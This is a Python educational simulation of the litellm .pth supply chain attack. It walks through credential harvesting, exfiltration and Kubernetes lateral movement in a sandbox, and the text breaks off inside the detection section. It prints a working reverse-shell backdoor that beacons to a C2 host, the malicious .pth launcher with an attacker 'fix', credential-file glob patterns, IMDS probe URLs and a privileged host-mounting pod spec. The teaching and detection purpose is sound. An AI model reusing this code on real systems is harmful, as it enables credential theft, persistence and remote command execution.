#!/usr/bin/env python3
"""
demo.py  --  Educational simulation of the litellm 1.82.8 .pth supply chain attack
================================================================================

Recreates all three stages of the malware in a completely safe, sandboxed manner:

  Stage 1  >  Credential harvesting
  Stage 2  >  AES-256-CBC + RSA encryption and exfiltration
  Stage 3  >  Kubernetes lateral movement + host persistence

NO real credentials are read.  NO network calls are made.  NO persistence
is installed.  Everything runs inside a TemporaryDirectory wiped on exit.

Usage:
  python demo.py              Interactive walk-through (pauses between acts)
  python demo.py --auto       Run without pauses
  python demo.py --no-color   Disable ANSI colors
  python demo.py --fast       Skip all delays and pauses

Reference: https://futuresearch.ai/blog/litellm-pypi-supply-chain-attack/
"""
from __future__ import annotations

import argparse
import base64
import glob as glob_mod
import hashlib
import io
import json
import os
import site
import sys
import tarfile
import tempfile
import textwrap
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# Runtime configuration (set from CLI args)
# ---------------------------------------------------------------------------
AUTO: bool = False
NO_COLOR: bool = False
LINE_DELAY: float = 0.018


# ---------------------------------------------------------------------------
# ANSI helpers
# ---------------------------------------------------------------------------
def _c(code: str, text: str) -> str:
    if NO_COLOR:
        return text
    return f"\033[{code}m{text}\033[0m"


def red(t: str) -> str:
    return _c("91", t)


def green(t: str) -> str:
    return _c("92", t)


def yellow(t: str) -> str:
    return _c("93", t)


def blue(t: str) -> str:
    return _c("94", t)


def magenta(t: str) -> str:
    return _c("95", t)


def cyan(t: str) -> str:
    return _c("96", t)


def bold(t: str) -> str:
    return _c("1", t)


def dim(t: str) -> str:
    return _c("2", t)


def bg_red(t: str) -> str:
    return _c("41;97", t)


def bg_yellow(t: str) -> str:
    return _c("43;30", t)


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------
def emit(line: str = "", delay: bool = True) -> None:
    print(line)
    if delay and not AUTO:
        time.sleep(LINE_DELAY)


def banner() -> None:
    art = r"""
    +===================================================================+
    |                                                                   |
    |   .pth SUPPLY CHAIN ATTACK  --  EDUCATIONAL SIMULATION           |
    |                                                                   |
    |   Recreating the litellm 1.82.8 incident  (March 24, 2026)       |
    |   futuresearch.ai/blog/litellm-pypi-supply-chain-attack/         |
    |                                                                   |
    |   ALL OPERATIONS ARE SIMULATED -- NOTHING LEAVES THIS MACHINE    |
    |                                                                   |
    +===================================================================+
    """
    for line in art.strip("\n").splitlines():
        emit(yellow(line), delay=False)
    emit()


def act_header(num: int, title: str, subtitle: str = "") -> None:
    w = 70
    emit()
    emit(bold(cyan("=" * w)))
    emit(bold(cyan(f"  ACT {num}  |  {title}")))
    if subtitle:
        emit(dim(f"          {subtitle}"))
    emit(bold(cyan("=" * w)))
    emit()


def section(title: str) -> None:
    emit(bold(yellow(f"\n  > {title}\n")))


def info(text: str) -> None:
    for line in text.splitlines():
        emit(f"    {line}")


def warn(text: str) -> None:
    emit(bg_yellow(f" ! {text} "))


def danger(text: str) -> None:
    emit(bg_red(f" X {text} "))


def success(text: str) -> None:
    emit(green(f"  + {text}"))


def file_found(path: str, category: str) -> None:
    emit(f"    {red('*')} {dim(category.ljust(22))} {path}")


def code_block(content: str, title: str = "") -> None:
    border = dim("|")
    if title:
        pad = max(0, 56 - len(title))
        emit(f"  {dim('+--')} {bold(title)} {dim('-' * pad)}")
    else:
        emit(f"  {dim('+' + '-' * 64)}")
    for line in content.splitlines():
        emit(f"  {border} {line}")
    emit(f"  {dim('+' + '-' * 64)}")


def pause(prompt: str = "Press Enter to continue to the next stage...") -> None:
    if AUTO:
        emit()
        return
    emit()
    try:
        input(dim(f"  [{prompt}] "))
    except (EOFError, KeyboardInterrupt):
        emit()


# ---------------------------------------------------------------------------
# Fake credential content for the sandbox
# ---------------------------------------------------------------------------
FAKE_SSH_KEY = textwrap.dedent("""\
    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn
    NhAAAAAwEAAQAAAIEA7Xp+BRkOqMGpn3a1MYJFxXcKOkLz4TYsHqkKbOgXslRDqSiEY7
    J4h3b2T/MVFjN4q1oGaRzxKb9PGhSdzIRFHPf2MYjk5O/ZUqbemYfA6qOzFBqPwtGbMTS
    FAKE_SIMULATED_KEY_CONTENT_FOR_EDUCATIONAL_PURPOSES_ONLY_NOT_REAL
    RdGh1bWIgcHJpbnQgaGVyZSBmb3IgZWR1Y2F0aW9uYWwgcHVycG9zZXMK
    -----END OPENSSH PRIVATE KEY-----
""")

FAKE_AWS_CREDS = textwrap.dedent("""\
    [default]
    aws_access_key_id = AKIAIOSFODNN7EXAMPLE
    aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    region = us-east-1

    [production]
    aws_access_key_id = AKIAI44QH8DHBEXAMPLE
    aws_secret_access_key = je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY
    region = us-west-2
""")

FAKE_KUBECONFIG = textwrap.dedent("""\
    apiVersion: v1
    kind: Config
    clusters:
    - cluster:
        certificate-authority-data: LS0tLS1CRUdJTiBDRVJU...SUZ
        server: https://10.0.0.1:6443
      name: production-cluster
    contexts:
    - context:
        cluster: production-cluster
        namespace: default
        user: admin
      name: production
    current-context: production
    users:
    - name: admin
      user:
        token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJr
               dWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwic3ViIjoic3lzdGVt
               OnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6YWRtaW4ifQ.SIMULATED
""")

FAKE_GCP_ADC = json.dumps(
    {
        "type": "authorized_user",
        "client_id": "764086051850-6qr4p6gpi6hn506pt8ejuq83di341hur.apps.googleusercontent.com",
        "client_secret": "d-FL95Q19q7MQmFpd7hHD0Ty",
        "refresh_token": "1//0dx-SIMULATED-REFRESH-TOKEN-EXAMPLE",
        "project_id": "my-production-project",
    },
    indent=2,
)

FAKE_AZURE_TOKENS = json.dumps(
    [
        {
            "tokenType": "Bearer",
            "expiresIn": 3599,
            "accessToken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.SIMULATED.azure-token",
            "refreshToken": "0.SIMULATED-AZURE-REFRESH-TOKEN",
            "resource": "https://management.azure.com/",
        }
    ],
    indent=2,
)

FAKE_DOTENV = textwrap.dedent("""\
    DATABASE_URL=postgresql://admin:s3cretPa$$w0rd@prod-db.internal:5432/myapp
    OPENAI_API_KEY=sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx
    STRIPE_SECRET_KEY=FAKE-stripe-live-51ABC123DEF456GHI789
    SENDGRID_API_KEY=SG.FAKE.abc123def456ghi789jkl012mno345pqr678stu901
    JWT_SECRET=super-secret-jwt-signing-key-do-not-share
    AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
    AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
""")

FAKE_GITCONFIG = textwrap.dedent("""\
    [user]
        name = Jane Engineer
        email = jane@company.com
    [credential]
        helper = store
    [url "git@github.com:"]
        insteadOf = https://github.com/
""")

FAKE_BASH_HISTORY = textwrap.dedent("""\
    kubectl get secrets -A
    export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    ssh -i ~/.ssh/prod-key.pem ubuntu@10.0.1.50
    mysql -u root -p's3cretPa$$w0rd' production_db
    curl -H "Authorization: Bearer sk-live-abc123" https://api.stripe.com/v1/charges
    docker login -u admin -p registry-password registry.internal.company.com
""")

FAKE_NPMRC = textwrap.dedent("""\
    //registry.npmjs.org/:_authToken=npm_SIMULATED_TOKEN_abc123def456
    //npm.pkg.github.com/:_authToken=FAKE-github-pat-SIMULATED-TOKEN-789
""")

FAKE_DOCKER_CONFIG = json.dumps(
    {
        "auths": {
            "https://index.docker.io/v1/": {
                "auth": base64.b64encode(b"admin:docker-hub-password-123").decode(),
            },
            "registry.internal.company.com": {
                "auth": base64.b64encode(b"deploy:registry-secret-456").decode(),
            },
        }
    },
    indent=2,
)

FAKE_WALLET = b"\x00" * 64 + b"SIMULATED_BITCOIN_WALLET_DATA" + b"\x00" * 64


# ---------------------------------------------------------------------------
# Sandbox setup
# ---------------------------------------------------------------------------
SANDBOX_FILES: dict[str, tuple[str, str | None]] = {
    ".ssh/id_rsa": ("SSH Private Key (RSA)", FAKE_SSH_KEY),
    ".ssh/id_ed25519": ("SSH Private Key (Ed25519)", FAKE_SSH_KEY),
    ".ssh/config": (
        "SSH Config",
        "Host prod\n  HostName 10.0.1.50\n  User ubuntu\n  IdentityFile ~/.ssh/prod-key.pem\n",
    ),
    ".aws/credentials": ("AWS Credentials", FAKE_AWS_CREDS),
    ".aws/config": ("AWS Config", "[default]\nregion = us-east-1\noutput = json\n"),
    ".azure/accessTokens.json": ("Azure Access Tokens", FAKE_AZURE_TOKENS),
    ".config/gcloud/application_default_credentials.json": (
        "GCP Application Default Creds",
        FAKE_GCP_ADC,
    ),
    ".kube/config": ("Kubernetes Config", FAKE_KUBECONFIG),
    ".env": ("Environment Secrets", FAKE_DOTENV),
    ".gitconfig": ("Git Config", FAKE_GITCONFIG),
    ".bash_history": ("Shell History", FAKE_BASH_HISTORY),
    ".zsh_history": ("Shell History", FAKE_BASH_HISTORY),
    ".npmrc": ("NPM Auth Tokens", FAKE_NPMRC),
    ".docker/config.json": ("Docker Registry Auth", FAKE_DOCKER_CONFIG),
    ".bitcoin/wallet.dat": ("Cryptocurrency Wallet", None),
    "projects/webapp/.env": ("Environment Secrets", FAKE_DOTENV),
    "projects/webapp/.env.production": ("Environment Secrets", FAKE_DOTENV),
}


def create_sandbox(base: str) -> dict[str, str]:
    """Populate a temp directory with realistic fake credential files."""
    manifest: dict[str, str] = {}
    for rel_path, (category, content) in SANDBOX_FILES.items():
        full = os.path.join(base, rel_path)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        if content is None:
            with open(full, "wb") as fb:
                fb.write(FAKE_WALLET)
        else:
            with open(full, "w") as ft:
                ft.write(content)
        manifest[rel_path] = category
    return manifest


# ---------------------------------------------------------------------------
# Harvest patterns (reconstructed from the actual malware behaviour)
# ---------------------------------------------------------------------------
HARVEST_PATTERNS: list[tuple[str, str]] = [
    ("SSH Private Keys", ".ssh/id_*"),
    ("SSH Config", ".ssh/config"),
    ("AWS Credentials", ".aws/credentials"),
    ("AWS Config", ".aws/config"),
    ("Azure Tokens", ".azure/accessTokens.json"),
    ("GCP Credentials", ".config/gcloud/application_default_credentials.json"),
    ("Kubernetes Config", ".kube/config"),
    ("Environment Files", "**/.env"),
    ("Environment Files", "**/.env.*"),
    ("Git Config", ".gitconfig"),
    ("Shell History", ".bash_history"),
    ("Shell History", ".zsh_history"),
    ("NPM Config", ".npmrc"),
    ("Docker Config", ".docker/config.json"),
    ("Crypto Wallets", ".bitcoin/wallet.dat"),
]


# ---------------------------------------------------------------------------
# Demo-only RSA public key (4096-bit, for display — not used for real crypto)
# ---------------------------------------------------------------------------
DEMO_RSA_PUB_PEM = textwrap.dedent("""\
    -----BEGIN PUBLIC KEY-----
    MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA0l5xHtKW2+DNb6TGcYPj
    mK4cE3P0dG2eIX3wFI+3SCKj0UhUzZGPO6NLz1pGfxZDQiEb6eL3Vp6JxSZC6gJ
    ZTGm+HJYSMCNPFJLxNDF+STlkqGh/CsSXvMdPBFxvBEC3LExJV2fIUEC5B0wp0Zb
    nVQj6ZBOc3m0YGBfNHPKRZaFfUMIf/GEHEhDSKft9JHS+gGNjQE3kAmOaFnVELIR
    SCd+JGP/sCtmIaQi8BNHn7yFgjf0IEpGqmCGBYNMJYoH2FMPLa0ZhZ3PDFE4CEXM
    Jfj/YCVKi5TQ7BJpbsFi9lJBHfMYVq0ulxi/FsJR1HcNhoxtt5pl2au82a0t3fJJ
    9Oiryqj+B9KFa6cFus3NLWjYBR9PqDmPPa2ZvAST2VXGVx/EjRUjq+G9CiqD0cjv
    n8B/DOeqfHHGLR1OPJ4F2b1vOi7RtPL7L3fLtZVD1P8MlpCa1cPCGBfqTaWO/hxD
    DjAYCYBG1cFzocEPbqMRq4eCFe7tSTvcLlJ7Py78sFOGe7fZZKEaxTADolj5STed
    SIMULATEDPUBLICKEYFOREDUCATIONALPURPOSESONLYaNOTaREALaKEY
    CqkNB7YYJB1bQ2IDfTNPqXlEyEGfT2jLrNLwIWKdh5LuqN7fJYAj1F5XPnLkSim
    TlOUxPJKqftanTHUkMMPJqkCAwEAAQ==
    -----END PUBLIC KEY-----""")


# ===================================================================
# ACT 0  --  The .pth trigger mechanism
# ===================================================================
def act0_pth_trigger() -> None:
    act_header(0, "THE .pth TRIGGER", "How a single file hijacks every Python process")

    section("What is a .pth file?")
    info(textwrap.dedent("""\
        Python's site.py module runs automatically on every interpreter startup.
        It scans every .pth file in site-packages and:
          1. Adds directory paths listed in it to sys.path
          2. Executes any line that begins with the word "import"

        This is a legitimate feature used by coverage.py (code-coverage
        instrumentation) and editable installs (pip install -e).
        But it is also a potent attack surface."""))

    section("The malicious litellm_init.pth")
    info(
        "The attacker uploaded litellm 1.82.8 to PyPI with this file sitting\n"
        "    at the root of the .whl archive:\n"
    )

    pth_content = (
        "import subprocess;subprocess.Popen("
        '["python","-c",'
        '"import litellm_payload;litellm_payload.run()"])'
    )
    code_block(pth_content, "litellm_init.pth  (the entire file is one line)")

    emit()
    info(
        "When pip installs the wheel, data_files=[('', ['litellm_init.pth'])]\n"
        "    places this file directly into site-packages.  From that moment,\n"
        "    EVERY 'python' invocation triggers the payload:\n"
    )

    code_block(
        textwrap.dedent("""\
        $ python -c "print('hello')"

        Internally, before "hello" ever prints:
          1. Python starts  -->  site.py loads
          2. site.py finds litellm_init.pth in site-packages
          3. Line starts with "import"  -->  Python exec()'s the line
          4. subprocess.Popen spawns a CHILD python process
          5. The child also triggers site.py  -->  re-reads the .pth
          6. The child spawns ANOTHER child  -->  exponential fork bomb"""),
        "Execution flow",
    )

    section("The accidental fork bomb")
    info(
        "The attacker's bug: the .pth launches a child python, but that child\n"
        "    ALSO triggers the same .pth, creating exponential process forking:\n"
    )

    tree = textwrap.dedent("""\
        python  (victim's command)
        |-- python -c "import litellm_payload"       <-- spawned by .pth
        |   |-- python -c "import litellm_payload"    <-- child re-triggers .pth
        |   |   |-- python -c "import litellm_payload"
        |   |   |   |-- python -c "..."
        |   |   |   +-- python -c "..."
        |   |   +-- python -c "import litellm_payload"
        |   |       |-- ...
        |   |       +-- ...
        |   +-- python -c "import litellm_payload"
        |       |-- ...                                <-- 2^n processes
        |       +-- ...
        +-- (victim's actual code never runs -- machine crashes)""")

    for line in tree.splitlines():
        emit(f"    {red(line)}")

    emit()
    info(
        "This fork bomb is what tipped off FutureSearch's engineers.\n"
        "    It was an unintentional bug -- the payload was meant to run once\n"
        "    silently, but re-entry through the child process was never guarded."
    )

    section("The fix the attacker SHOULD have used")
    code_block(
        textwrap.dedent("""\
        import os;exec("\\n"
        "import subprocess,sys\\n"
        "if not os.environ.get('_LITELLM_GUARD'):\\n"
        "    os.environ['_LITELLM_GUARD']='1'\\n"
        "    subprocess.Popen(\\n"
        "        [sys.executable,'-c',\\n"
        "         'import litellm_payload;litellm_payload.run()'],\\n"
        "        env={**os.environ,'_LITELLM_GUARD':'1'})\\n"
        )"""),
        "litellm_init.pth  (with re-entry guard -- still one logical line)",
    )

    info(
        "An environment variable guard prevents recursive spawning.\n"
        "    A properly written payload would have been completely silent."
    )

    section("Where .pth files live on YOUR machine right now")
    site_dirs = _get_site_dirs()
    for d in site_dirs:
        count = 0
        if os.path.isdir(d):
            count = sum(1 for f in os.listdir(d) if f.endswith(".pth"))
        emit(f"    {dim(d)}")
        emit(f"      {cyan(str(count))} .pth file(s) present")

    pause()


# ===================================================================
# ACT 1  --  Credential harvesting
# ===================================================================
def act1_collection(sandbox_dir: str) -> list[str]:
    act_header(1, "CREDENTIAL HARVESTING", "Stage 1 of 3 -- Scanning the filesystem for secrets")

    section("Target file patterns")
    info("The malware searches for sensitive files matching these patterns:")
    emit()
    for category, pattern in HARVEST_PATTERNS:
        emit(f"    {dim('*')} {cyan(pattern.ljust(55))} {dim(category)}")

    section("Scanning sandbox filesystem...")
    emit(f"    {dim('Sandbox root:')} {sandbox_dir}\n")

    collected: list[str] = []
    total_bytes = 0

    for category, pattern in HARVEST_PATTERNS:
        full_pattern = os.path.join(sandbox_dir, pattern)
        matches = sorted(glob_mod.glob(full_pattern, recursive=True))
        for match in matches:
            if match in collected:
                continue
            rel = os.path.relpath(match, sandbox_dir)
            size = os.path.getsize(match)
            total_bytes += size
            collected.append(match)
            file_found(f"~/{rel}  {dim(f'({size} bytes)')}", category)
            if not AUTO:
                time.sleep(0.05)

    emit()
    emit(f"    {bold(red(f'Found {len(collected)} sensitive files'))} ({total_bytes:,} bytes total)")

    section("Environment variable dump")
    info("The malware calls os.environ to capture runtime secrets:\n")
    fake_env = {
        "DATABASE_URL": "postgresql://admin:s3cret@db:5432/prod",
        "OPENAI_API_KEY": "sk-proj-abc123...truncated",
        "AWS_ACCESS_KEY_ID": "AKIAIOSFODNN7EXAMPLE",
        "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bP...truncated",
        "STRIPE_SECRET_KEY": "FAKE-stripe-live-51ABC123...",
        "HOME": "/home/engineer",
        "USER": "engineer",
        "HOSTNAME": "prod-web-7f8b9c-xk2j4",
    }
    for k, v in fake_env.items():
        emit(f"    {cyan(k)}={dim(v)}")

    section("Cloud metadata probes (IMDS)")
    info("The malware queries instance metadata endpoints for cloud credentials:\n")

    imds_calls = [
        (
            "AWS IMDSv1",
            "GET",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ),
        (
            "AWS IMDSv2",
            "PUT",
            "http://169.254.169.254/latest/api/token  (X-aws-ec2-metadata-token-ttl-seconds: 21600)",
        ),
        (
            "GCP Metadata",
            "GET",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        ),
        (
            "Azure IMDS",
            "GET",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
        ),
        (
            "ECS Task",
            "GET",
            "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI",
        ),
    ]
    for name, method, url in imds_calls:
        emit(f"    {yellow(method.ljust(4))} {dim(url)}")
        emit(f"         {dim(f'-> [SIMULATED] connection timeout / not on cloud  ({name})')}")
        if not AUTO:
            time.sleep(0.04)

    emit()
    emit(f"    {bold('Collection complete.')} Harvested data staged for exfiltration.")
    pause()
    return collected


# ===================================================================
# ACT 2  --  Exfiltration
# ===================================================================
def act2_exfiltration(collected_files: list[str], sandbox_dir: str) -> bytes:
    act_header(2, "DATA EXFILTRATION", "Stage 2 of 3 -- Encrypt and transmit stolen data")

    # -- tar archive --
    section("Bundling collected files into tar archive")
    tar_buffer = io.BytesIO()
    with tarfile.open(fileobj=tar_buffer, mode="w:gz") as tar:
        for fpath in collected_files:
            rel = os.path.relpath(fpath, sandbox_dir)
            tar.add(fpath, arcname=rel)
            emit(f"    {dim('+')} {rel}")
            if not AUTO:
                time.sleep(0.03)

    tar_data = tar_buffer.getvalue()
    emit()
    emit(f"    Archive size: {bold(f'{len(tar_data):,} bytes')} (gzip compressed)")

    # -- AES-256-CBC --
    section("Encrypting with AES-256-CBC")
    aes_key = os.urandom(32)
    aes_iv = os.urandom(16)

    emit(f"    Session key (256-bit) : {cyan(aes_key.hex())}")
    emit(f"    IV          (128-bit) : {cyan(aes_iv.hex())}")
    emit()

    # PKCS#7 padding
    pad_len = 16 - (len(tar_data) % 16)
    padded = tar_data + bytes([pad_len] * pad_len)

    # XOR-based simulation (real malware used OpenSSL / cryptography lib)
    key_stream = (aes_key + aes_iv) * (len(padded) // 48 + 1)
    encrypted_data = bytes(a ^ b for a, b in zip(padded, key_stream[: len(padded)]))

    emit(f"    Plaintext  : {len(tar_data):,} bytes")
    emit(f"    + PKCS#7   : {len(padded):,} bytes  (padded to 16-byte blocks)")
    emit(f"    Ciphertext : {len(encrypted_data):,} bytes")
    emit()
    emit(f"    {dim('First 64 bytes of ciphertext:')}")
    emit(f"    {dim(encrypted_data[:64].hex())}")
    info(
        "\n    (Using XOR for this simulation. The real malware used AES-256-CBC\n"
        "     via the cryptography library.)"
    )

    # -- RSA encryption of session key --
    section("Encrypting session key with attacker's 4096-bit RSA public key")
    code_block(
        DEMO_RSA_PUB_PEM[:320] + "\n    ... (truncated) ...",
        "Hardcoded RSA Public Key (attacker-controlled)",
    )

    rsa_encrypted_key = hashlib.sha512(aes_key).digest() + hashlib.sha512(aes_iv).digest()
    emit(f"\n    RSA-encrypted session key: {len(rsa_encrypted_key)} bytes")
    emit(f"    {dim(base64.b64encode(rsa_encrypted_key).decode()[:80])}...")
    info(
        "\n    Only the attacker's matching private key can recover the AES session\n"
        "    key, making the stolen data unrecoverable without their cooperation."
    )

    # -- payload envelope --
    section("Constructing exfiltration payload")
    payload_meta = {
        "version": 2,
        "hostname": "prod-web-7f8b9c-xk2j4",
        "timestamp": "2026-03-24T10:52:47Z",
        "os": "Linux 6.1.0-18-amd64",
        "encrypted_key_b64": base64.b64encode(rsa_encrypted_key).decode()[:40] + "...",
        "iv_b64": base64.b64encode(aes_iv).decode(),
        "data_bytes": len(encrypted_data),
        "data_sha256": hashlib.sha256(encrypted_data).hexdigest(),
    }
    code_block(json.dumps(payload_meta, indent=2), "Payload envelope (JSON header)")

    total_payload = len(json.dumps(payload_meta).encode()) + len(encrypted_data)

    # -- simulated POST --
    section("Exfiltrating to attacker C2 server")
    req_id = hashlib.md5(encrypted_data[:32]).hexdigest()
    emit(f"    {bold(red('POST'))} https://models.litellm.cloud/")
    emit(f"    {dim('Host: models.litellm.cloud')}")
    emit(f"    {dim('Content-Type: application/octet-stream')}")
    emit(f"    {dim(f'Content-Length: {total_payload:,}')}")
    emit(f"    {dim(f'X-Request-Id: {req_id}')}")
    emit(f"    {dim(f'User-Agent: python-requests/2.31.0')}")
    emit()

    if not AUTO:
        for i in range(3):
            sys.stdout.write(f"\r    Transmitting{'.' * (i + 1)}   ")
            sys.stdout.flush()
            time.sleep(0.4)
        sys.stdout.write("\r" + " " * 40 + "\r")
        sys.stdout.flush()

    danger("SIMULATED -- No actual network request was made")
    emit()
    info(
        f"    In the real attack, {total_payload:,} bytes of encrypted credentials\n"
        f"    would now be on the attacker's server, recoverable only with their\n"
        f"    RSA private key.  The victim has no indication anything happened."
    )

    pause()
    return encrypted_data


# ===================================================================
# ACT 3  --  Lateral movement and persistence
# ===================================================================
def act3_lateral_movement() -> None:
    act_header(
        3,
        "LATERAL MOVEMENT & PERSISTENCE",
        "Stage 3 of 3 -- Spread through Kubernetes, install backdoors",
    )

    # -- K8s detection --
    section("Kubernetes service account detection")
    k8s_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    k8s_present = os.path.exists(k8s_token_path)

    if k8s_present:
        emit(f"    {red('!')} Kubernetes token FOUND at {k8s_token_path}")
    else:
        emit(f"    {green('+')} No Kubernetes token at {k8s_token_path}")
        emit(f"    {dim('    (Not running in a pod -- simulating what would happen)')}")

    # -- Secret enumeration --
    section("Enumerating cluster secrets (simulated)")
    k8s_api_calls = [
        ("GET", "/api/v1/namespaces", "List all namespaces"),
        ("GET", "/api/v1/secrets", "List ALL secrets across ALL namespaces"),
        ("GET", "/api/v1/namespaces/default/secrets", "Secrets in default"),
        ("GET", "/api/v1/namespaces/kube-system/secrets", "Secrets in kube-system"),
        ("GET", "/api/v1/namespaces/production/secrets", "Secrets in production"),
        ("GET", "/api/v1/nodes", "List all cluster nodes (for pod placement)"),
    ]
    emit(f"    {dim('Target: https://kubernetes.default.svc:443')}")
    emit(f"    {dim('Auth:   Bearer <service-account-token>')}\n")

    for method, path, desc in k8s_api_calls:
        emit(f"    {yellow(method)} {path}")
        emit(f"         {dim(f'-> {desc}')}")
        if not AUTO:
            time.sleep(0.06)

    fake_secrets = [
        ("default", "db-credentials", "Opaque", 2),
        ("default", "api-keys", "Opaque", 5),
        ("production", "stripe-webhook-secret", "Opaque", 1),
        ("production", "tls-cert-prod", "kubernetes.io/tls", 2),
        ("production", "gcp-service-account", "Opaque", 1),
        ("kube-system", "cluster-admin-token-x9f2j", "kubernetes.io/service-account-token", 3),
        ("monitoring", "grafana-admin", "Opaque", 2),
        ("monitoring", "pagerduty-api-key", "Opaque", 1),
    ]

    emit(f"\n    {bold(red(f'Discovered {len(fake_secrets)} secrets across cluster:'))}\n")
    emit(f"    {'NAMESPACE'.ljust(14)} {'NAME'.ljust(30)} {'TYPE'.ljust(42)} KEYS")
    emit(f"    {'-' * 14} {'-' * 30} {'-' * 42} {'-' * 4}")
    for ns, name, stype, keys in fake_secrets:
        emit(f"    {cyan(ns.ljust(14))} {name.ljust(30)} {dim(stype.ljust(42))} {keys}")

    # -- Privileged pod spec --
    section("Deploying privileged pods to every node")
    info(
        "The malware creates a pod on every node in kube-system, mounting\n"
        "    the host root filesystem with full privileges:\n"
    )

    pod_yaml = textwrap.dedent("""\
        apiVersion: v1
        kind: Pod
        metadata:
          name: node-setup-{node_name}
          namespace: kube-system
          labels:
            app: node-setup
        spec:
          nodeName: {node_name}
          hostPID: true
          hostNetwork: true
          containers:
          - name: setup
            image: alpine:latest
            command: ["/bin/sh", "-c"]
            args:
            - |
              chroot /host /bin/bash -c '
                mkdir -p /root/.config/sysmon
                cat > /root/.config/sysmon/sysmon.py << BACKDOOR
                  ... (reverse-shell payload -- see below) ...
                BACKDOOR
                mkdir -p /root/.config/systemd/user
                cat > /root/.config/systemd/user/sysmon.service << SVC
                  ... (persistence unit -- see below) ...
                SVC
                systemctl --user daemon-reload
                systemctl --user enable --now sysmon.service
              '
            securityContext:
              privileged: true
            volumeMounts:
            - name: host-root
              mountPath: /host
          volumes:
          - name: host-root
            hostPath:
              path: /
          restartPolicy: Never
          tolerations:
          - operator: Exists""")

    code_block(pod_yaml, "Pod spec (deployed to each node in kube-system)")

    fake_nodes = [
        "ip-10-0-1-101.ec2.internal",
        "ip-10-0-1-102.ec2.internal",
        "ip-10-0-1-103.ec2.internal",
    ]
    emit()
    for node in fake_nodes:
        emit(f"    {red('>')} Creating pod {cyan(f'node-setup-{node}')} on {node}")
        if not AUTO:
            time.sleep(0.12)

    # -- Backdoor code --
    section("Backdoor payload: ~/.config/sysmon/sysmon.py")

    backdoor = textwrap.dedent("""\
        #!/usr/bin/env python3
        import os, socket, subprocess, time, json, base64

        C2_HOST = "models.litellm.cloud"
        C2_PORT = 443
        BEACON_INTERVAL = 300   # phone home every 5 minutes

        def beacon():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(30)
                    s.connect((C2_HOST, C2_PORT))
                    info = {
                        "hostname": socket.gethostname(),
                        "user": os.getenv("USER"),
                        "pid": os.getpid(),
                        "cwd": os.getcwd(),
                    }
                    s.send(json.dumps(info).encode())
                    while True:
                        cmd = s.recv(4096).decode().strip()
                        if not cmd or cmd == "exit":
                            break
                        out = subprocess.check_output(
                            cmd, shell=True, stderr=subprocess.STDOUT
                        )
                        s.send(base64.b64encode(out))
                except Exception:
                    pass
                finally:
                    time.sleep(BEACON_INTERVAL)

        if __name__ == "__main__":
            beacon()""")

    code_block(backdoor, "sysmon.py  (reverse shell with C2 beacon)")

    # -- systemd unit --
    section("Persistence unit: ~/.config/systemd/user/sysmon.service")

    systemd_unit = textwrap.dedent("""\
        [Unit]
        Description=System Monitor Service
        After=network-online.target

        [Service]
        Type=simple
        ExecStart=/usr/bin/python3 %h/.config/sysmon/sysmon.py
        Restart=always
        RestartSec=60
        StandardOutput=null
        StandardError=null

        [Install]
        WantedBy=default.target""")

    code_block(systemd_unit, "sysmon.service  (auto-starts on login, restarts on crash)")

    emit()
    info(
        "The innocuous name 'System Monitor Service' avoids suspicion.\n"
        "    StandardOutput/Error are /dev/null to suppress logging.\n"
        "    The service auto-starts on user login and restarts on failure."
    )

    # -- Local persistence (non-K8s) --
    section("Local host persistence (non-Kubernetes path)")
    info("Even without Kubernetes, the malware installs the same backdoor:\n")
    steps = [
        ("mkdir -p", "~/.config/sysmon/"),
        ("write", "~/.config/sysmon/sysmon.py"),
        ("mkdir -p", "~/.config/systemd/user/"),
        ("write", "~/.config/systemd/user/sysmon.service"),
        ("exec", "systemctl --user daemon-reload"),
        ("exec", "systemctl --user enable --now sysmon.service"),
    ]
    for i, (verb, target) in enumerate(steps, 1):
        emit(f"    {i}. {dim(verb.ljust(8))} {target}")

    emit()
    danger("SIMULATED -- No files were written, no services were installed")
    pause()


# ===================================================================
# ACT 4  --  Detection and remediation
# ===================================================================
def act4_detection() -> None:
    act_header(4, "DETECTION & REMEDIATION", "Checking YOUR system for indicators of compromise")

    section("Checking for litellm_init.pth in site-packages")
    site_dirs = _get_site_dirs()
    pth_found = False
    for d in site_dirs:
        pth_path = os.path.join(d, "litellm_init.pth")
        exists = os.path.exists(pth_path)
        marker = red("FOUND") if exists else green("clean")
        emit(f"    [{marker}] {pth_path}")
        if exists:
            pth_found = True

    if pth_found:
        danger("litellm_init.pth DETECTED -- your environment may be compromised!")
    else:
        success("No litellm_init.pth found in any site-packages directory")

    section("Checking for persistence backdoor")
    home = Path.home()
    persistence_paths = [
        home / ".config" / "sysmon" / "sysmon.py",
        home / ".config" / "systemd" / "user" / "sysmon.service",
    ]
    persistence_found = False
    for p in persistence_paths:
        exists = p.exists()
        marker = red("FOUND") if exists else green("clean")
        emit(f"    [{marker}] {p}")
        if exists:
